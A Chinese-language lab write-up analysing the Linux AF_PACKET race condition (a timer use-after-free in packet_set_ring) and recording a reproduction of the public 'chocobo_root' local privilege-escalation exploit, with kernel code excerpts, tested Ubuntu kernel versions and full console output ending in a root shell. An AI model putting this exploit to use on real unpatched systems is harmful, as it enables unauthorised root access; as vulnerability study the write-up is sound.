# 漏洞原理分析
1. 该漏洞最早存在于2011年四月的代码中，与2016年11月30号被修复，但网上并未提及哪些内核版本包含该漏洞，部分资料显示内核需要升级到4.8.13以上才能避免该漏洞。
2. 该漏洞主要利用了net/packet/af_packet.c代码中存在条件竞争,在新建AF_PACKET套接字，可以从普通用户升级为超级用户。
3. packet_set_ring函数在创建ringbuffer的时候，如果packet版本为TPACKET_V3，则会初始化struct timer_list。packet_set_ring函数返回之前，其他线程可调用setsockopt函数将packet版本设定为TPACKET_V1。前面初始化的timer未在内核队列中被注销，timer过期时触发struct timer_list中回调函数的执行，形成UAF漏洞。packet_set_ring函数的部分代码如下，其中init_prb_bdqc()间接调用init_timer()。
    ```
    switch(po->tp_version){
    case TPACKET_V3:
    
    /* Transmit path isnot supported. We checked
    * it above but justbeing paranoid
    */
    if(!tx_ring)
    init_prb_bdqc(po, rb, pg_vec, req_u);
             break;
             default:
             break;
    }
    ```
4. 当套接字关闭，packet_set_ring函数会再次被调用，如果packet的版本大于TPACKET_V2，内核会在队列中注销掉先前的这个定时器，但是packet版本被更改为TPACKET_V1后，就不会注销timer，等到timer过期，内核自动执行timer中的过期处理函数。packet_set_ring函数的部分代码如下，只有tp_version > TPACKET_V2时才会释放该timer。
    ```
    if(closing &&(po->tp_version > TPACKET_V2)){
             /* Because we don't support block-based V3 on tx-ring */
             if(!tx_ring)
                       prb_shutdown_retire_blk_timer(po, rb_queue);
    }
    ```
5. 这个时候，需要使用内存喷射的方式来覆盖timer未释放的空间，即替换成攻击者指定的函数。

# 重现
1. 在笔记本上重现了该漏洞，耗时大概27秒钟，替换了内核的版本，使用的是4.4.0-47-generic。
    ```
    Linux aowen-K43E 4.4.0-47-generic #68-Ubuntu SMP Wed Oct 26 19:39:52 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
    ```
2. 某些版本的，根据poc的介绍，poc作者在一下三个版本的系统中测试过，重现过程最好与一下版本一致。
Ubuntu 16.04: 4.4.0-51-generic
Ubuntu 16.04: 4.4.0-47-generic
Ubuntu 16.04: 4.4.0-36-generic
2. 重现的执行过程如下：
    ```
    aowen@aowen-K43E:~/git/exploit/chocobo_root$ gcc chocobo_root.c -o chocobo_root -lpthread
    aowen@aowen-K43E:~/git/exploit/chocobo_root$ ls
    chocobo_root  chocobo_root.c  README.md
    aowen@aowen-K43E:~/git/exploit/chocobo_root$ ./chocobo_root 
    linux AF_PACKET race condition exploit by rebel
    kernel version: 4.4.0-47-generic #68
    proc_dostring = 0xffffffff81088040
    modprobe_path = 0xffffffff81e48f80
    register_sysctl_table = 0xffffffff81287800
    set_memory_rw = 0xffffffff8106f320
    exploit starting
    making vsyscall page writable..
    
    new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
    sockets allocated
    removing barrier and spraying..
    version switcher stopping, x = -1 (y = 627643, last val = 2)
    current packet version = 0
    pbd->hdr.bh1.offset_to_first_pkt = 0
    race not won
    
    retrying stage..
    new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
    sockets allocated
    removing barrier and spraying..
    version switcher stopping, x = -1 (y = 280264, last val = 0)
    current packet version = 2
    pbd->hdr.bh1.offset_to_first_pkt = 48
    race not won
    
    retrying stage..
    new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
    sockets allocated
    removing barrier and spraying..
    version switcher stopping, x = -1 (y = 306797, last val = 2)
    current packet version = 0
    pbd->hdr.bh1.offset_to_first_pkt = 48
    *=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
    please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
    closing socket and verifying..
    vsyscall page altered!
    
    
    stage 1 completed
    registering new sysctl..
    
    new exploit attempt starting, jumping to 0xffffffff81287800, arg=0xffffffffff600850
    sockets allocated
    removing barrier and spraying..
    version switcher stopping, x = -1 (y = 148261, last val = 2)
    current packet version = 0
    pbd->hdr.bh1.offset_to_first_pkt = 48
    *=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
    please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
    closing socket and verifying..
    sysctl added!
    
    stage 2 completed
    binary executed by kernel, launching rootshell
    root@aowen-K43E:~/git/exploit/chocobo_root# 
    
    ```
1. 执行的截图
 ![image](pic/chocobo.png)

# 注意事项
1. 几次实验中，在单核cpu上，无法产生竞争条件，而给qemu 加入-smp 2参数的时候，虽然可以产生竞争条件，但是系统运行过程中死机

# 参考
1. [freebuf的一篇文章](http://www.freebuf.com/vuls/122152.html)
2. [黑客技术](http://www.hackdig.com/12/hack-42094.htm) 
